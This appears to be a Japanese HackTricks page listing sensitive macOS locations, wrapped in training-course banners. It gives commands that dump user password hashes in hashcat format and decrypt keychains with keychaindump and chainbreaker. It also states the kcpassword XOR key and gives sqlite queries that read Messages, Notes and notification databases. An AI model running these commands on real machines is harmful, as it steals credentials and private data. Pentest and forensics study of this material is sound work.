# macOSの敏感な場所と興味深いデーモン

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}

## パスワード

### シャドウパスワード

シャドウパスワードは、**`/var/db/dslocal/nodes/Default/users/`**にあるplistにユーザーの設定と共に保存されます。\
次のワンライナーを使用して、**ユーザーに関するすべての情報**（ハッシュ情報を含む）をダンプできます：

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**このようなスクリプト**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) または [**こちらのスクリプト**](https://github.com/octomagon/davegrohl.git) は、ハッシュを **hashcat** **フォーマット** に変換するために使用できます。

非サービスアカウントのすべてのクレデンシャルをハッシュキャットフォーマット `-m 7100` (macOS PBKDF2-SHA512) でダンプする代替のワンライナー: 

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### キーチェーンダンプ

セキュリティバイナリを使用して**復号化されたパスワードをダンプ**する際、いくつかのプロンプトが表示され、ユーザーにこの操作を許可するよう求められます。
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
このコメントに基づくと [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)、これらのツールはBig Surではもう機能していないようです。
{% endhint %}

### Keychaindump 概要

**keychaindump**というツールは、macOSのキーチェーンからパスワードを抽出するために開発されましたが、Big Surのような新しいmacOSバージョンでは制限があります。**keychaindump**の使用には、攻撃者がアクセスを得て**root**権限を昇格させる必要があります。このツールは、ユーザーのログイン時にキーチェーンがデフォルトでロック解除されるという事実を利用しており、アプリケーションがユーザーのパスワードを繰り返し要求することなくアクセスできるようにしています。しかし、ユーザーが使用後にキーチェーンをロックすることを選択した場合、**keychaindump**は無効になります。

**Keychaindump**は、Appleによって認可および暗号操作のためのデーモンとして説明されている特定のプロセス**securityd**をターゲットにして動作します。抽出プロセスは、ユーザーのログインパスワードから派生した**マスターキー**を特定することを含みます。このキーはキーチェーンファイルを読み取るために不可欠です。**マスターキー**を見つけるために、**keychaindump**は`vmmap`コマンドを使用して**securityd**のメモリヒープをスキャンし、`MALLOC_TINY`としてフラグ付けされた領域内の潜在的なキーを探します。これらのメモリ位置を検査するために使用されるコマンドは次のとおりです：
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
潜在的なマスターキーを特定した後、**keychaindump**は特定のパターン（`0x0000000000000018`）を示すヒープを検索し、マスターキーの候補を特定します。このキーを利用するには、**keychaindump**のソースコードに記載されているように、さらなる手順としてデオブフスケーションが必要です。この分野に焦点を当てるアナリストは、キーを復号化するための重要なデータが**securityd**プロセスのメモリ内に保存されていることに注意する必要があります。**keychaindump**を実行するためのコマンドの例は次のとおりです：
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) は、法的に正当な方法でOSXキーチェーンから以下の種類の情報を抽出するために使用できます：

* ハッシュ化されたキーチェーンパスワード、[hashcat](https://hashcat.net/hashcat/) または [John the Ripper](https://www.openwall.com/john/) でのクラッキングに適しています
* インターネットパスワード
* 一般的なパスワード
* プライベートキー
* パブリックキー
* X509証明書
* セキュアノート
* Appleshareパスワード

キーチェーンのアンロックパスワード、[volafox](https://github.com/n0fate/volafox) または [volatility](https://github.com/volatilityfoundation/volatility) を使用して取得したマスターキー、またはSystemKeyのようなアンロックファイルがある場合、Chainbreakerはプレーンテキストパスワードも提供します。

これらのいずれかの方法でキーチェーンをアンロックできない場合、Chainbreakerは他のすべての利用可能な情報を表示します。

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKeyを使用してキーチェーンキー（パスワード付き）をダンプする**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **キーチェーンキーのダンプ（パスワード付き）ハッシュをクラッキングする**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **メモリダンプを使用してキーチェーンキー（パスワード付き）をダンプする**

[これらの手順に従ってください](../#dumping-memory-with-osxpmem) **メモリダンプ**を実行します
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **ユーザーのパスワードを使用してキーチェーンキー（パスワード付き）をダンプする**

ユーザーのパスワードを知っていれば、それを使用して**ユーザーに属するキーチェーンをダンプおよび復号化する**ことができます。
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword**ファイルは、**ユーザーのログインパスワード**を保持するファイルですが、システム所有者が**自動ログイン**を**有効にしている**場合のみです。したがって、ユーザーはパスワードを求められることなく自動的にログインされます（これはあまり安全ではありません）。

パスワードは、ファイル**`/etc/kcpassword`**に**`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**というキーでXORされて保存されています。ユーザーのパスワードがキーより長い場合、キーは再利用されます。\
これにより、パスワードは比較的簡単に復元できます。たとえば、[**このスクリプト**](https://gist.github.com/opshope/32f65875d45215c3677d)を使用することができます。

## データベース内の興味深い情報

### メッセージ
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### 通知

Notificationsデータは`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`にあります。

興味深い情報のほとんどは**blob**にあります。したがって、その内容を**抽出**し、**人間が読める**形式に**変換**するか、**`strings`**を使用する必要があります。アクセスするには、次のようにします：

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### ノート

ユーザーの**ノート**は `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` にあります。

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

## Preferences

macOSアプリの設定は**`$HOME/Library/Preferences`**にあり、iOSでは`/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`にあります。&#x20;

macOSでは、cliツール**`defaults`**を使用して**Preferencesファイルを変更**できます。

**`/usr/sbin/cfprefsd`**はXPCサービス`com.apple.cfprefsd.daemon`と`com.apple.cfprefsd.agent`を主張し、設定を変更するなどのアクションを実行するために呼び出すことができます。

## System Notifications

### Darwin Notifications

通知の主要なデーモンは**`/usr/sbin/notifyd`**です。通知を受信するためには、クライアントは`com.apple.system.notification_center` Machポートを通じて登録する必要があります（`sudo lsmp -p <pid notifyd>`で確認できます）。デーモンは`/etc/notify.conf`ファイルで設定可能です。

通知に使用される名前はユニークな逆DNS表記であり、通知がそのうちの1つに送信されると、それを処理できると示したクライアントが受信します。

現在の状態をダンプし（すべての名前を確認する）、notifydプロセスにSIGUSR2信号を送信し、生成されたファイル`/var/run/notifyd_<pid>.status`を読み取ることが可能です。
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**Distributed Notification Center**の主なバイナリは**`/usr/sbin/distnoted`**であり、通知を送信する別の方法です。いくつかのXPCサービスを公開し、クライアントを検証しようとするチェックを実行します。

### Apple Push Notifications (APN)

この場合、アプリケーションは**トピック**に登録できます。クライアントは**`apsd`**を介してAppleのサーバーに連絡し、トークンを生成します。\
その後、プロバイダーもトークンを生成し、Appleのサーバーに接続してクライアントにメッセージを送信できるようになります。これらのメッセージは、**`apsd`**によってローカルで受信され、通知を待っているアプリケーションに中継されます。

設定は`/Library/Preferences/com.apple.apsd.plist`にあります。

macOSには`/Library/Application\ Support/ApplePushService/aps.db`に、iOSには`/var/mobile/Library/ApplePushService`にメッセージのローカルデータベースがあります。これには3つのテーブルがあります：`incoming_messages`、`outgoing_messages`、および`channel`。
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
デーモンと接続に関する情報を取得することも可能です:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## ユーザー通知

これらはユーザーが画面で見るべき通知です：

* **`CFUserNotification`**: このAPIは、メッセージを表示するポップアップを画面に表示する方法を提供します。
* **掲示板**: これはiOSで消えるバナーを表示し、通知センターに保存されます。
* **`NSUserNotificationCenter`**: これはMacOSのiOS掲示板です。通知のデータベースは`/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`にあります。

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
